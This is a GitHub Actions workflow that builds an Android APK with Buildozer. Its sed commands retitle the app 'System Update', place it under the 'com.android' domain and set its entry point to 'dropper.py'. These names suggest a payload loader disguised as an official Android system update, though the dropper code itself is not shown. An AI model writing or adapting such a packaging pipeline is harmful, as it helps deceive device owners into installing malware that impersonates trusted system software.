name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            git openjdk-17-jdk zlib1g-dev libffi-dev libssl-dev \
            python3-pip build-essential libtool m4 autoconf automake \
            pkg-config libltdl-dev libltdl7

      - name: Upgrade autotools
        run: |
          sudo apt-get install -y autoconf automake libtool
          autoconf --version
          automake --version
          libtool --version

      - name: Install buildozer and dependencies
        run: |
          pip install --upgrade pip setuptools wheel
          pip install buildozer cython Pillow

      - name: Initialize buildozer
        run: buildozer init

      - name: Configure buildozer.spec
        run: |
          sed -i 's/requirements = python3,kivy/requirements = python3,requests,urllib3/g' buildozer.spec
          sed -i 's/title = My Application/title = System Update/g' buildozer.spec
          sed -i 's/package.name = myapp/package.name = systemupdate/g' buildozer.spec
          sed -i 's/package.domain = org.test/package.domain = com.android/g' buildozer.spec
          sed -i 's/#source.main = main.py/source.main = dropper.py/g' buildozer.spec
          echo 'android.accept_sdk_license = True' >> buildozer.spec
          sed -i 's/android.api = .*/android.api = 33/g' buildozer.spec
          sed -i 's/android.minapi = .*/android.minapi = 24/g' buildozer.spec
          sed -i 's/android.ndk = .*/android.ndk = 27.3.13750724/g' buildozer.spec

      - name: Build APK
        run: yes | buildozer android debug deploy run --verbose

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: systemupdate-apk
          path: bin/*.apk
